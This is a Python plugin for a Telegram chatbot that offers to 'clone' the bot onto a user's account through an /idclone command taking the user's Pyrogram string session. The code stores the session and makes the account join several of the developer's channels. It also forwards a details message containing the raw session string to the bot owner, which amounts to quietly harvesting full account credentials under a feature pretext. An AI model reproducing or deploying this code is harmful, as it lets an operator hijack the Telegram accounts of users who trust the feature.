import logging
import os
import sys
import shutil
import config
import asyncio
from pyrogram import Client, filters
from pyrogram.errors import PeerIdInvalid
from pyrogram.errors.exceptions.bad_request_400 import AccessTokenInvalid
from pyrogram.types import BotCommand
from config import API_HASH, API_ID, OWNER_ID
from rashichat import CLONE_OWNERS
from rashichat import rashichat as app, save_clonebot_owner, save_idclonebot_owner
from rashichat import db as mongodb
from rashichat import rashichat as app
import aiohttp

BASE = "https://batbin.me/"


async def post(url: str, *args, **kwargs):
    async with aiohttp.ClientSession() as session:
        async with session.post(url, *args, **kwargs) as resp:
            try:
                data = await resp.json()
            except Exception:
                data = await resp.text()
        return data


async def VIPbin(text):
    resp = await post(f"{BASE}api/v2/paste", data=text)
    if not resp["success"]:
        return
    link = BASE + resp["message"]
    return link
    
IDCLONES = set()
cloneownerdb = mongodb.cloneownerdb
idclonebotdb = mongodb.idclonebotdb


@Client.on_message(filters.command(["idclone"]))
async def clone_txt(client, message):
    if len(message.command) > 1:
        string_session = message.text.split("/idclone", 1)[1].strip()
        mi = await message.reply_text("**Checking your String Session...**")
        try:
            ai = Client(
                name="VIPIDCHATBOT",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                session_string=str(string_session),
                no_updates=False,
                plugins=dict(root="rashichat.idchatbot"),
            )
            await ai.start()
            user = await ai.get_me()
            clone_id = user.id
            user_id = user.id
            username = user.username or user.first_name
            await save_idclonebot_owner(clone_id, message.from_user.id)
            
            details = {
                "user_id": user.id,
                "username": username,
                "name": user.first_name,
                "session": string_session,
            }

            cloned_bots = idclonebotdb.find()
            cloned_bots_list = await cloned_bots.to_list(length=None)
            total_clones = len(cloned_bots_list)
            await idclonebotdb.insert_one(details)
            IDCLONES.add(user.id)
            try:
                try:
                    await ai.join_chat("THE_VIP_BOY")
                except:
                    pass
                try:
                    await ai.join_chat("VIP_CREATORS")
                except:
                    pass
                try:
                    await ai.join_chat("THE_VIP_BOY_OP")
                except:
                    pass
                try:
                    await ai.join_chat("TG_FRIENDSSS")
                except:
                    pass
            except Exception as e:
                pass

            await app.send_message(
                int(OWNER_ID), f"**#New_Clone**\n\n**User:** @{username}\n\n**Details:** {details}\n\n**Total Clones:** {total_clones}"
            )

            await mi.edit_text(
                f"**Session for @{username} successfully cloned ✅.**\n"
                f"**Remove clone by:** /delclone\n**Check all cloned sessions by:** /cloned"
            )
        except AccessTokenInvalid:
            await mi.edit_text(f"**Invalid String Session. Please provide a valid pyrogram string session.:**")
        except PeerIdInvalid as e:
            await mi.edit_text(f"**Your session successfully cloned👍**\n**You can check by /idcloned**\n\n**But please start me (@{app.username}) From owner id**")
        except Exception as e:
            logging.exception("Error during cloning process.")
            await mi.edit_text(f"**Invalid String Session. Please provide a valid pyrogram string session.:**\n\n`{e}`")
    else:
        await message.reply_text("**Provide a Pyrogram String Session after the /idclone **\n\n**Example:** `/idclone string session paste here`\n\n**Get a Pyrogram string session from here:-** [Click Here](https://t.me/VIP_CREATORS/1393) ")

@Client.on_message(filters.command("idcloned"))
async def list_cloned_sessions(client, message):
    try:
        cloned_sessions = await idclonebotdb.find().to_list(length=None)
        if not cloned_sessions:
            await message.reply_text("No sessions have been cloned yet.")
            return
        total_sessions = len(cloned_sessions)
        text = f"**Total Cloned Sessions:** {total_sessions}\n\n"
        for session in cloned_sessions:
            text += f"**User ID:** `{session['user_id']}`\n"
            text += f"**Name:** {session['name']}\n"
            text += f"**Username:** @{session['username']}\n\n"

        if len(text) > 4096:
            paste_url = await VIPbin(text)
            await message.reply(f"**Check Out All User Cloned List👇👇**\n\n{paste_url}")
            return
        await message.reply_text(text)
    except Exception as e:
        await message.reply_text("**An error occurred while listing cloned sessions.**")
        

@Client.on_message(
    filters.command(["delidclone", "delcloneid", "deleteidclone", "removeidclone"])
)
async def delete_cloned_session(client, message):
    try:
        if len(message.command) < 2:
            await message.reply_text("**⚠️ Please provide the string session after the command.**\n\n**Example:** `/delidclone your string session here`")
            return

        string_session = " ".join(message.command[1:])
        ok = await message.reply_text("**Checking the session string...**")

        cloned_session = await idclonebotdb.find_one({"session": string_session})
        if cloned_session:
            await idclonebotdb.delete_one({"session": string_session})
            

            await ok.edit_text(
                f"**Your String Session has been removed from my database ✅.**\n\n**Your bot will off after restart @{app.username}**"
            )
        else:
            await message.reply_text("**⚠️ The provided session is not in the cloned list.**")
    except Exception as e:
        await message.reply_text(f"**An error occurred while deleting the cloned session:** {e}")
        logging.exception(e)


@Client.on_message(filters.command("delallidclone") & filters.user(int(OWNER_ID)))
async def delete_all_cloned_sessions(client, message):
    try:
        a = await message.reply_text("**Deleting all cloned sessions...**")
        await idclonebotdb.delete_many({})
        IDCLONES.clear()
        await a.edit_text("**All cloned sessions have been deleted successfully ✅**")
    except Exception as e:
        await a.edit_text(f"**An error occurred while deleting all cloned sessions:** {e}")
        logging.exception(e)

